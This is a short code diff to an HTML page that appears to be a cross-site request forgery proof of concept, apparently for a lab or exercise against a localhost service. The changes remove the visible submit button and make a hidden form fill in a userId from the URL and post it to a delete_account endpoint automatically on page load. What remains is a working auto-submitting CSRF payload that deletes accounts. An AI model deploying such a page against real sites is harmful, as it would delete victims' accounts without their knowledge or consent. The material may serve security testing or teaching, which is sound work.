@@ -18,11 +18,9 @@
     id="ez_csrf_form"
     target="ez_csrf_iframe"
     action="http://localhost:8080/delete_account"
-    enctype="multipart/form-data"
     method="POST"
   >
     <input type="hidden" id="ez_delete" name="userId" value="" />
-    <input type="submit" value="Submit request">
   </form>
   <script>
     window.onload = () => {
@@ -30,9 +28,8 @@
       const del = url.searchParams.get("delete");
 
       document.getElementById('ez_delete').value = del;
+      document.getElementById('ez_csrf_form').submit();
     }
-
-    document.getElementById('ez_csrf_form').submit();
   </script>
 </body>
 </html>
